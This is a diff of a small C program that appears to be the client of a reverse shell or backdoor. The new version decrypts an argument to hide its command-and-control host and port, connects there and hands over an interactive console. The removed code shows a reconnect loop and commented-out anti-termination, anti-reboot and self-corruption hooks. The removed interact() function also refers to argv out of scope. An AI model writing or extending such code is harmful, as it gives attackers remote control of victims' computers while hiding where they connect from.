@@ -27,32 +27,28 @@
 #include <stdlib.h>
 #include <stdio.h>
 
-#include "utils.h"
+#include "json.h"
+#include "crypto.h"
 #include "console.h"
 #include "channel.h"
 
-void interact()
-{
-    for (;;) {
-        int channel = open_channel(argv[1], atoi(argv[2]));
-        if (channel < 0)
-            continue;
-
-        interact_console(channel);
-        close_channel(channel);
-    }
-}
-
 int main(int argc, char *argv[])
 {
-    if (argc == 3) {
-        /* prevent_termination(); */
-        /* prevent_reboot(); */
+    if (argc > 1) {
+        char *input = decrypt(argv[1]);
+        JSONObject *json = parseJSON(input);
 
-        interact();
+        char *host = find_json(json, "host");
+        char *port = find_json(json, "port");
 
-        /* self_corrupt(argv[0]); */
-    }
+        int channel = open_channel(host, atoi(port));
+        if (channel < 0)
+            return -1;
+
+        interact(channel);
+        close_channel(channel);
+    } else
+        return 1;
 
     return 0;
 }
